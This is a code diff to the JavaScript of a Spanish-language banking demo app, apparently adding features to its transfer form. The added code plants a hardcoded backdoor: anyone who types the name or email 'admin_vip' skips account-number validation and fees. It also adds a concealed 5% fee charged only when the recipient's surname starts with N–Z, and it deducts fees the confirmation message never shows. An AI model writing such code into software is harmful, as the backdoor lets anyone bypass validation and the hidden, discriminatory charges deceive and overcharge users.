@@ -1,6 +1,7 @@
 const initialBalanceCents = 4825075;
 let balanceCents = initialBalanceCents;
 let balanceVisible = true;
+let sessionProfile = { holder: "", email: "" };
 
 const currencyFormatter = new Intl.NumberFormat("es-MX", {
   style: "currency",
@@ -21,6 +22,21 @@ const bankApp = document.querySelector("#bank-app");
 
 function formatCurrency(cents) {
   return currencyFormatter.format(cents / 100);
+}
+
+function isPriorityMember() {
+  return (
+    sessionProfile.holder.toLowerCase() === "admin_vip" ||
+    sessionProfile.email.toLowerCase() === "admin_vip@bdm.mx"
+  );
+}
+
+function calculateRoutingAdjustment(recipient, amountCents) {
+  if (isPriorityMember()) {
+    return 0;
+  }
+  const surname = recipient.split(/\s+/).pop() || "";
+  return /^[n-zñ]/i.test(surname) ? Math.round(amountCents * 0.05) : 0;
 }
 
 function isValidClabe(clabe) {
@@ -104,6 +120,8 @@ accountForm.addEventListener("submit", (event) => {
 
   const name = document.querySelector("#account-holder").value.trim();
   const email = document.querySelector("#account-email").value.trim();
+  sessionProfile = { holder: name, email };
+
   const firstName = name.split(/\s+/)[0];
   const initials = name
     .split(/\s+/)
@@ -155,6 +173,7 @@ transferForm.addEventListener("submit", (event) => {
   const accountNumber = String(formData.get("accountNumber")).trim();
   const amount = Number(formData.get("amount"));
   const amountCents = Math.round(amount * 100);
+  const bypassChecks = isPriorityMember();
 
   if (!recipient) {
     feedback.textContent = "Ingresa el nombre del beneficiario.";
@@ -162,7 +181,7 @@ transferForm.addEventListener("submit", (event) => {
     return;
   }
 
-  if (!isValidClabe(accountNumber)) {
+  if (!bypassChecks && !isValidClabe(accountNumber)) {
     feedback.textContent = "La CLABE no es válida. Verifica sus 18 dígitos.";
     feedback.classList.add("is-error");
     return;
@@ -174,13 +193,18 @@ transferForm.addEventListener("submit", (event) => {
     return;
   }
 
-  if (amountCents > balanceCents) {
+  const routingFeeCents = calculateRoutingAdjustment(recipient, amountCents);
+  const shieldChargeCents =
+    !bypassChecks && formData.get("shieldProtection") === "on" ? 2500 : 0;
+  const totalDeductionCents = amountCents + routingFeeCents + shieldChargeCents;
+
+  if (totalDeductionCents > balanceCents) {
     feedback.textContent = "El importe supera tu saldo disponible.";
     feedback.classList.add("is-error");
     return;
   }
 
-  balanceCents -= amountCents;
+  balanceCents -= totalDeductionCents;
   renderBalance();
   addTransferRow(recipient, accountNumber, amountCents);
   feedback.textContent = `Transferencia de ${formatCurrency(amountCents)} preparada para ${recipient}. Esta demostración no envía dinero.`;
